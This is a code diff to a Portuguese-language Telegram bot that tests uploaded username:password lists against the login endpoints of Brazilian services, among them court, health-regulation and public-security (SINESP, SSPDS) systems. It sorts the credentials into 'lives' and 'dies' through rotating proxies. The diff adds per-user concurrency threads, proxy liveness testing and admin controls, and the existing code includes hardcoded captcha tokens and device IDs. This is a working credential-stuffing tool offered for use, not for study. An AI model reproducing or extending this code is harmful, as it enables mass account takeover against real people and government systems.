@@ -22,6 +22,7 @@ from dotenv import load_dotenv
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import (
     Application,
+    ApplicationHandlerStop,
     CallbackQueryHandler,
     CommandHandler,
     ContextTypes,
@@ -64,7 +65,8 @@ def db_init():
                 username  TEXT    DEFAULT '',
                 full_name TEXT    DEFAULT '',
                 is_auth   INTEGER DEFAULT 0,
-                added_at  TEXT    DEFAULT (datetime('now'))
+                added_at  TEXT    DEFAULT (datetime('now')),
+                threads   INTEGER DEFAULT 1
             );
             CREATE TABLE IF NOT EXISTS permissions (
                 user_id INTEGER,
@@ -77,6 +79,10 @@ def db_init():
                 proxies TEXT    DEFAULT ''
             );
         """)
+        # Safe migration for existing DBs without threads column
+        cols = [r[1] for r in c.execute("PRAGMA table_info(users)").fetchall()]
+        if "threads" not in cols:
+            c.execute("ALTER TABLE users ADD COLUMN threads INTEGER DEFAULT 1")
 
 def _db(q, *args, fetch=None):
     with sqlite3.connect(DB_PATH) as c:
@@ -126,6 +132,14 @@ def get_user_proxies(uid):
 def set_user_proxies(uid, text: str):
     _db("INSERT OR REPLACE INTO user_proxies (user_id, proxies) VALUES (?,?)", uid, text)
 
+def get_user_threads(uid):
+    if is_admin(uid): return 5
+    r = _db("SELECT threads FROM users WHERE user_id=?", uid, fetch="one")
+    return r[0] if r and r[0] else 1
+
+def set_user_threads(uid, n: int):
+    _db("UPDATE users SET threads=? WHERE user_id=?", n, uid)
+
 # ── Proxy helpers ───────────────────────────────────────────────────────────────
 def _proxy_for(uid):
     lst = get_user_proxies(uid)
@@ -135,21 +149,22 @@ def _proxy_for(uid):
 
 # ── Checker functions ───────────────────────────────────────────────────────────
 # Each returns ("live"|"die"|"nvinculado"|"erro", extra_str)
-# Logic copied exactly from mul.py; only proxy and return format adapted.
 
 def _chk_checkok(user, pwd, px_fn):
     try:
         r = requests.post(
             "https://bff.checkok.com.br/auth/rok",
-            headers={"accept": "application/json, text/plain, */*",
-                     "content-type": "application/json",
-                     "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36"},
-            data=f'{{"username": "{user}", "password": "{pwd}"}}',
+            headers={
+                "accept": "application/json, text/plain, */*",
+                "content-type": "application/json",
+                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36",
+            },
+            data=f'{{"username":"{user}","password":"{pwd}"}}',
             proxies=px_fn(), allow_redirects=False, timeout=15,
         )
         return ("live", "") if "negado" not in r.text else ("die", "")
     except Exception as e:
-        return ("erro", str(e)[:40])
+        return ("erro", str(e)[:60])
 
 def _chk_consultcenter(user, pwd, px_fn):
     try:
@@ -175,7 +190,7 @@ def _chk_consultcenter(user, pwd, px_fn):
             return ("live", "")
         return ("die", "")
     except Exception as e:
-        return ("erro", str(e)[:40])
+        return ("erro", str(e)[:60])
 
 def _chk_credicorp(user, pwd, px_fn):
     try:
@@ -194,7 +209,7 @@ def _chk_credicorp(user, pwd, px_fn):
             return ("live", "token")
         return ("die", "")
     except Exception as e:
-        return ("erro", str(e)[:40])
+        return ("erro", str(e)[:60])
 
 def _chk_correiopmsp(user, pwd, px_fn):
     try:
@@ -216,7 +231,7 @@ def _chk_correiopmsp(user, pwd, px_fn):
             return ("live", "")
         return ("die", "")
     except Exception as e:
-        return ("erro", str(e)[:40])
+        return ("erro", str(e)[:60])
 
 def _chk_sisreg(user, pwd, px_fn):
     try:
@@ -237,7 +252,7 @@ def _chk_sisreg(user, pwd, px_fn):
             return ("die", "")
         return ("live", msg or f"status {r.status_code}")
     except Exception as e:
-        return ("erro", str(e)[:40])
+        return ("erro", str(e)[:60])
 
 def _chk_tjsp(user, pwd, px_fn):
     try:
@@ -273,7 +288,7 @@ def _chk_tjsp(user, pwd, px_fn):
             return ("live", "")
         return ("die", "")
     except Exception as e:
-        return ("erro", str(e)[:40])
+        return ("erro", str(e)[:60])
 
 def _chk_sspds(user, pwd, px_fn):
     try:
@@ -298,7 +313,7 @@ def _chk_sspds(user, pwd, px_fn):
             return ("live", "")
         return ("die", "")
     except Exception as e:
-        return ("erro", str(e)[:40])
+        return ("erro", str(e)[:60])
 
 _SINESP_DISP = "2412DPC0AG"
 _SINESP_INST = "ed5f8007-7d67-409f-afce-2e8fc7e7e059"
@@ -346,7 +361,7 @@ def _chk_sinesp(user, pwd, px_fn):
             return ("live", f"token:{str(token)[:20]}...")
         return ("die", "")
     except Exception as e:
-        return ("erro", str(e)[:40])
+        return ("erro", str(e)[:60])
 
 _CHECKONN_CAP = (
     "0cAFcWeA6-VItkOKwH4qO_GB7Tf2ftDzZmkLq9WNjes3aFQ_Z1zsy582pFybIczVJxtnQTBUYhw6_ASRtuCat2cR9snyQMXQKjwFEQuh"
@@ -401,7 +416,7 @@ def _chk_checkonn(user, pwd, px_fn):
         )
         return ("die", "") if is_die else ("live", "")
     except Exception as e:
-        return ("erro", str(e)[:40])
+        return ("erro", str(e)[:60])
 
 CHECKER_FN = {
     "checkok":       _chk_checkok,
@@ -491,7 +506,7 @@ def _kb_admin():
             InlineKeyboardButton("👥 Usuários",      callback_data="adm:users"),
             InlineKeyboardButton("🌐 Gerar Proxies", callback_data="adm:proxygen"),
         ],
-        [InlineKeyboardButton("📊 Status",          callback_data="adm:status")],
+        [InlineKeyboardButton("📊 Status",           callback_data="adm:status")],
     ])
 
 def _kb_users(users):
@@ -503,12 +518,23 @@ def _kb_users(users):
     return InlineKeyboardMarkup(rows)
 
 def _kb_manage(target_uid, is_a):
-    rows = [[
-        InlineKeyboardButton(
-            "🔴 Revogar acesso" if is_a else "🟢 Autorizar acesso",
-            callback_data=f"auth:{target_uid}:{'0' if is_a else '1'}",
-        )
-    ]]
+    rows = []
+
+    # Auth toggle
+    rows.append([InlineKeyboardButton(
+        "🔴 Revogar acesso" if is_a else "🟢 Autorizar acesso",
+        callback_data=f"auth:{target_uid}:{'0' if is_a else '1'}",
+    )])
+
+    # Thread control
+    current_threads = get_user_threads(target_uid)
+    thread_row = []
+    for n in [1, 2, 3, 5]:
+        icon = "🔵" if current_threads == n else "⚪"
+        thread_row.append(InlineKeyboardButton(f"{icon}{n}T", callback_data=f"thd:{target_uid}:{n}"))
+    rows.append(thread_row)
+
+    # Checker permissions
     perm_rows = _db("SELECT checker, enabled FROM permissions WHERE user_id=?", target_uid, fetch="all") or []
     perm_map  = {r[0]: r[1] for r in perm_rows}
     btns = [
@@ -523,6 +549,14 @@ def _kb_manage(target_uid, is_a):
         if i + 1 < len(btns):
             row.append(btns[i + 1])
         rows.append(row)
+
+    # Delete user proxies
+    px_count = len(get_user_proxies(target_uid))
+    rows.append([InlineKeyboardButton(
+        f"🗑️ Limpar proxies ({px_count})" if px_count else "🗑️ Sem proxies (vazio)",
+        callback_data=f"delpx:{target_uid}",
+    )])
+
     rows.append([InlineKeyboardButton("🔙 Usuários", callback_data="adm:users")])
     return InlineKeyboardMarkup(rows)
 
@@ -557,7 +591,7 @@ async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if not is_admin(uid):
         return
-    total = len(list_users())
+    total  = len(list_users())
     authed = sum(1 for u in list_users() if u[3])
     await update.message.reply_text(
         f"⚡ *Painel Admin*\n`Total: {total}  |  Auth: {authed}`",
@@ -569,19 +603,62 @@ async def cmd_myproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if not is_auth(uid):
         return
+    px_count = len(get_user_proxies(uid))
     ctx.user_data["waiting_proxy"] = True
+    status = f"✅ {px_count} proxies ativos" if px_count else "❌ Sem proxies"
+    kb = None
+    if px_count:
+        kb = InlineKeyboardMarkup([[
+            InlineKeyboardButton("🗑️ Limpar proxies", callback_data="px:clear")
+        ]])
     await update.message.reply_text(
-        "📤 Envie o arquivo de proxies *.txt*\nFormato: `ip:porta` por linha.",
+        f"🌐 *Gerenciar Proxies*\n{status}\n\nEnvie um arquivo *.txt* com proxies (`ip:porta` por linha).",
         parse_mode="Markdown",
+        reply_markup=kb,
     )
 
-async def cmd_clearproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if not is_auth(uid):
+async def cmd_perfil(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    u   = update.effective_user
+    uid = u.id
+    ensure_user(uid, u.username, u.full_name)
+    px_count = len(get_user_proxies(uid))
+
+    if is_admin(uid):
+        users  = list_users()
+        authed = sum(1 for x in users if x[3])
+        await update.message.reply_text(
+            f"👑 *Perfil Admin*\n"
+            f"```\n"
+            f"Nome     : {u.full_name or u.username or uid}\n"
+            f"ID       : {uid}\n"
+            f"Threads  : ilimitado\n"
+            f"Proxies  : {px_count}\n"
+            f"Usuários : {len(users)}\n"
+            f"Auth     : {authed}\n"
+            f"```",
+            parse_mode="Markdown",
+        )
         return
-    set_user_proxies(uid, "")
+
+    row = _db("SELECT username, full_name, is_auth, added_at, threads FROM users WHERE user_id=?", uid, fetch="one")
+    if not row:
+        await update.message.reply_text("❌ Usuário não encontrado.")
+        return
+    uname, fname, is_a, added_at, threads = row
+    chks     = get_user_checkers(uid)
+    chk_list = ", ".join(CHECKERS[k] for k in chks) if chks else "nenhum"
     await update.message.reply_text(
-        "🗑️ Proxies removidos. As checagens agora vão direto, sem proxy."
+        f"👤 *Meu Perfil*\n"
+        f"```\n"
+        f"Nome     : {fname or uname or uid}\n"
+        f"ID       : {uid}\n"
+        f"Status   : {'✅ Autorizado' if is_a else '❌ Bloqueado'}\n"
+        f"Threads  : {threads or 1}\n"
+        f"Proxies  : {px_count}\n"
+        f"Checkers : {chk_list}\n"
+        f"Desde    : {(added_at or '')[:10] or 'N/A'}\n"
+        f"```",
+        parse_mode="Markdown",
     )
 
 async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
@@ -592,7 +669,70 @@ async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("❌ Cancelado.")
     return ConversationHandler.END
 
-# ── Document handler ────────────────────────────────────────────────────────────
+# ── Proxy document handler (runs in group -1, BEFORE the conversation) ──────────
+async def handle_proxy_upload(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """Intercepts document uploads when waiting_proxy is set, before the conv handler."""
+    if not ctx.user_data.get("waiting_proxy"):
+        return  # not for us — let the conv handler proceed
+
+    uid = update.effective_user.id
+    if not is_auth(uid):
+        ctx.user_data.pop("waiting_proxy", None)
+        raise ApplicationHandlerStop
+
+    ctx.user_data.pop("waiting_proxy")
+    doc = update.message.document
+    f   = await doc.get_file()
+    tmp = TMP_DIR / f"proxy_{uid}.txt"
+    await f.download_to_drive(str(tmp))
+    text  = tmp.read_text(encoding="utf-8", errors="ignore")
+    tmp.unlink(missing_ok=True)
+
+    lines = [l.strip() for l in text.splitlines() if l.strip()]
+    if not lines:
+        await update.message.reply_text("⚠️ Arquivo vazio ou sem proxies válidos.")
+        raise ApplicationHandlerStop
+
+    ctx.user_data["pending_proxies"] = text
+    await update.message.reply_text(
+        f"📋 *{len(lines)} proxies encontrados.*\nO que deseja fazer?",
+        parse_mode="Markdown",
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("🔍 Testar conectividade", callback_data="px:test"),
+            InlineKeyboardButton("✅ Salvar direto",        callback_data="px:save"),
+        ]]),
+    )
+    raise ApplicationHandlerStop
+
+# ── Proxy action callback ───────────────────────────────────────────────────────
+async def on_proxy_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q   = update.callback_query
+    await q.answer()
+    uid    = q.from_user.id
+    if not is_auth(uid):
+        return
+    action = q.data.split(":", 1)[1]
+
+    if action == "clear":
+        set_user_proxies(uid, "")
+        await q.edit_message_text("🗑️ Proxies removidos. Checagens vão direto, sem proxy.")
+
+    elif action == "save":
+        text = ctx.user_data.pop("pending_proxies", "")
+        set_user_proxies(uid, text)
+        count = len([l for l in text.splitlines() if l.strip()])
+        await q.edit_message_text(f"✅ {count} proxies salvos!")
+
+    elif action == "test":
+        text    = ctx.user_data.pop("pending_proxies", "")
+        proxies = [l.strip() for l in text.splitlines() if l.strip()]
+        if not proxies:
+            await q.edit_message_text("⚠️ Nenhum proxy para testar.")
+            return
+        await q.edit_message_text(f"🔍 Testando {len(proxies)} proxies... aguarde ⏳")
+        asyncio.create_task(_run_proxy_test(uid, proxies, q.message.chat_id, ctx.application))
+
+# ── Document handler (inside ConversationHandler) ───────────────────────────────
 async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     u   = update.effective_user
     uid = u.id
@@ -605,30 +745,16 @@ async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return ConversationHandler.END
 
     doc = update.message.document
-
-    # proxy file upload
-    if ctx.user_data.pop("waiting_proxy", False):
-        f   = await doc.get_file()
-        tmp = TMP_DIR / f"proxy_{uid}.txt"
-        await f.download_to_drive(str(tmp))
-        text = tmp.read_text(encoding="utf-8", errors="ignore")
-        tmp.unlink(missing_ok=True)
-        set_user_proxies(uid, text)
-        count = len([l for l in text.splitlines() if l.strip()])
-        await update.message.reply_text(f"✅ {count} proxies salvos!")
-        return ConversationHandler.END
-
     if not doc.file_name.lower().endswith(".txt"):
         await update.message.reply_text("⚠️ Envie um arquivo *.txt*", parse_mode="Markdown")
         return ConversationHandler.END
 
-    # save file
     f   = await doc.get_file()
     tmp = TMP_DIR / f"in_{uid}_{int(time.time())}.txt"
     await f.download_to_drive(str(tmp))
     ctx.user_data["tmp_file"] = str(tmp)
 
-    # if checker already chosen (new flow: /start → checker → file)
+    # new flow: checker already chosen → ask delimiter
     if ctx.user_data.get("checker"):
         await update.message.reply_text(
             f"✅ *{CHECKERS[ctx.user_data['checker']]}*\n\n🔤 Qual o *delimitador*?",
@@ -670,7 +796,6 @@ async def on_checker_chosen(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     ctx.user_data["checker"] = val
 
-    # if file already uploaded (legacy flow: file sent before /start)
     if ctx.user_data.get("tmp_file"):
         await q.edit_message_text(
             f"✅ *{CHECKERS[val]}*\n\n🔤 Qual o *delimitador*?",
@@ -688,7 +813,6 @@ async def on_checker_chosen(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 async def on_delim_chosen(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     q   = update.callback_query
     await q.answer()
-    uid = q.from_user.id
     val = q.data.split(":", 1)[1]
 
     if val == "cancel":
@@ -701,6 +825,7 @@ async def on_delim_chosen(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     checker  = ctx.user_data.pop("checker", None)
     tmp_file = ctx.user_data.pop("tmp_file", None)
+    uid      = q.from_user.id
 
     if not checker or not tmp_file:
         await q.edit_message_text("❌ Erro interno. Tente novamente.")
@@ -769,8 +894,9 @@ async def on_admin_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             return
         _, uname, fname, is_a = row
         name = fname or uname or str(target)
+        threads = get_user_threads(target)
         await q.edit_message_text(
-            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'}",
+            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {threads}T",
             parse_mode="Markdown",
             reply_markup=_kb_manage(target, bool(is_a)),
         )
@@ -782,8 +908,9 @@ async def on_admin_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         row    = _db("SELECT user_id, username, full_name, is_auth FROM users WHERE user_id=?", target, fetch="one")
         _, uname, fname, is_a = row
         name = fname or uname or str(target)
+        threads = get_user_threads(target)
         await q.edit_message_text(
-            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'}",
+            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {threads}T",
             parse_mode="Markdown",
             reply_markup=_kb_manage(target, bool(is_a)),
         )
@@ -804,8 +931,36 @@ async def on_admin_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         row    = _db("SELECT user_id, username, full_name, is_auth FROM users WHERE user_id=?", target, fetch="one")
         _, uname, fname, is_a = row
         name = fname or uname or str(target)
+        threads = get_user_threads(target)
         await q.edit_message_text(
-            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'}",
+            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {threads}T",
+            parse_mode="Markdown",
+            reply_markup=_kb_manage(target, bool(is_a)),
+        )
+
+    elif data.startswith("thd:"):
+        _, target, n = data.split(":")
+        target = int(target)
+        set_user_threads(target, int(n))
+        row    = _db("SELECT user_id, username, full_name, is_auth FROM users WHERE user_id=?", target, fetch="one")
+        _, uname, fname, is_a = row
+        name = fname or uname or str(target)
+        await q.edit_message_text(
+            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {int(n)}T",
+            parse_mode="Markdown",
+            reply_markup=_kb_manage(target, bool(is_a)),
+        )
+
+    elif data.startswith("delpx:"):
+        target = int(data.split(":")[1])
+        set_user_proxies(target, "")
+        row    = _db("SELECT user_id, username, full_name, is_auth FROM users WHERE user_id=?", target, fetch="one")
+        _, uname, fname, is_a = row
+        name = fname or uname or str(target)
+        threads = get_user_threads(target)
+        await q.answer("Proxies do usuário removidos!", show_alert=True)
+        await q.edit_message_text(
+            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {threads}T",
             parse_mode="Markdown",
             reply_markup=_kb_manage(target, bool(is_a)),
         )
@@ -841,6 +996,7 @@ async def _run_checker(chat_id, uid, checker, tmp_file, delim, app):
         )
 
         px_count = len(get_user_proxies(uid))
+        threads  = get_user_threads(uid)
 
         def px_fn():
             return _proxy_for(uid)
@@ -876,14 +1032,14 @@ async def _run_checker(chat_id, uid, checker, tmp_file, delim, app):
                 except Exception:
                     pass
 
-        if is_admin(uid):
-            sem = asyncio.Semaphore(3)
+        if threads > 1:
+            sem = asyncio.Semaphore(threads)
 
-            async def _admin_task(line):
+            async def _sem_task(line):
                 async with sem:
                     await _process(line)
 
-            tasks = [asyncio.create_task(_admin_task(l)) for l in lines]
+            tasks = [asyncio.create_task(_sem_task(l)) for l in lines]
             for t in asyncio.as_completed(tasks):
                 await t
                 await _edit_progress()
@@ -892,16 +1048,16 @@ async def _run_checker(chat_id, uid, checker, tmp_file, delim, app):
                 await _process(line)
                 await _edit_progress()
 
-        # final summary
         dies = total - len(lives) - len(nvinc)
         summary = (
             f"✅ *{name}* concluído!\n"
             f"```\n"
-            f"Total  : {total}\n"
-            f"Lives  : {len(lives)}\n"
-            f"Dies   : {dies}\n"
-            + (f"N.Vinc : {len(nvinc)}\n" if nvinc else "")
-            + f"Proxy  : {'ativo (' + str(px_count) + ')' if px_count else 'desativado'}\n"
+            f"Total   : {total}\n"
+            f"Lives   : {len(lives)}\n"
+            f"Dies    : {dies}\n"
+            + (f"N.Vinc  : {len(nvinc)}\n" if nvinc else "")
+            + f"Threads : {threads}\n"
+            + f"Proxy   : {'ativo (' + str(px_count) + ')' if px_count else 'desativado'}\n"
             + "```"
         )
         await prog.edit_text(summary, parse_mode="Markdown")
@@ -910,7 +1066,7 @@ async def _run_checker(chat_id, uid, checker, tmp_file, delim, app):
             erro_txt = "\n".join(f"• `{e}`" for e in erros)
             await app.bot.send_message(
                 chat_id,
-                f"⚠️ *Amostra de erros encontrados:*\n{erro_txt}",
+                f"⚠️ *Amostra de erros:*\n{erro_txt}",
                 parse_mode="Markdown",
             )
 
@@ -941,6 +1097,43 @@ async def _run_checker(chat_id, uid, checker, tmp_file, delim, app):
 
     except Exception as e:
         await app.bot.send_message(chat_id, f"❌ Erro: `{e}`", parse_mode="Markdown")
+
+# ── Background: proxy tester ────────────────────────────────────────────────────
+async def _run_proxy_test(uid, proxies, chat_id, app):
+    try:
+        total = len(proxies)
+        msg   = await app.bot.send_message(chat_id, f"🔍 Testando 0/{total}...")
+        vivos: list[str] = []
+        sem   = asyncio.Semaphore(20)
+        state = {"checked": 0, "last_edit": time.time()}
+
+        async def _chk(p):
+            async with sem:
+                ok = await asyncio.to_thread(_check_proxy_alive, p)
+                if ok:
+                    vivos.append(p)
+                state["checked"] += 1
+                now = time.time()
+                if now - state["last_edit"] >= 3:
+                    try:
+                        await msg.edit_text(f"🔍 Testando {state['checked']}/{total}... ✅ {len(vivos)}")
+                        state["last_edit"] = now
+                    except Exception:
+                        pass
+
+        await asyncio.gather(*[_chk(p) for p in proxies])
+        set_user_proxies(uid, "\n".join(vivos))
+        await msg.edit_text(
+            f"✅ *Teste concluído!*\n"
+            f"```\n"
+            f"Testados : {total}\n"
+            f"Vivos    : {len(vivos)}\n"
+            f"Mortos   : {total - len(vivos)}\n"
+            f"```",
+            parse_mode="Markdown",
+        )
+    except Exception as e:
+        await app.bot.send_message(chat_id, f"❌ Erro no teste: `{e}`", parse_mode="Markdown")
 
 # ── Background: proxy generator ─────────────────────────────────────────────────
 async def _run_proxy_gen(chat_id, app):
@@ -989,14 +1182,21 @@ def main():
 
     app = Application.builder().token(TOKEN).build()
 
+    # Proxy upload handler must run BEFORE the conversation to avoid
+    # documents being swallowed by the conv state machine.
+    app.add_handler(
+        MessageHandler(filters.Document.ALL, handle_proxy_upload),
+        group=-1,
+    )
+
     conv = ConversationHandler(
         entry_points=[
-            CommandHandler("start",        cmd_start),
+            CommandHandler("start",              cmd_start),
             MessageHandler(filters.Document.ALL, on_document),
         ],
         states={
             CHOOSE_CHECKER: [CallbackQueryHandler(on_checker_chosen, pattern=r"^chk:")],
-            WAIT_FILE:      [MessageHandler(filters.Document.ALL, on_document)],
+            WAIT_FILE:      [MessageHandler(filters.Document.ALL,    on_document)],
             CHOOSE_DELIM:   [CallbackQueryHandler(on_delim_chosen,   pattern=r"^dl:")],
         },
         fallbacks=[CommandHandler("cancel", cmd_cancel)],
@@ -1006,9 +1206,10 @@ def main():
 
     app.add_handler(conv)
     app.add_handler(CommandHandler("admin",   cmd_admin))
-    app.add_handler(CommandHandler("myproxy",    cmd_myproxy))
-    app.add_handler(CommandHandler("clearproxy", cmd_clearproxy))
-    app.add_handler(CallbackQueryHandler(on_admin_cb, pattern=r"^(adm:|usr:|auth:|perm:)"))
+    app.add_handler(CommandHandler("myproxy", cmd_myproxy))
+    app.add_handler(CommandHandler("perfil",  cmd_perfil))
+    app.add_handler(CallbackQueryHandler(on_proxy_cb,  pattern=r"^px:"))
+    app.add_handler(CallbackQueryHandler(on_admin_cb,  pattern=r"^(adm:|usr:|auth:|perm:|thd:|delpx:)"))
 
     print("✅ Bot iniciado.")
     app.run_polling(drop_pending_updates=True)
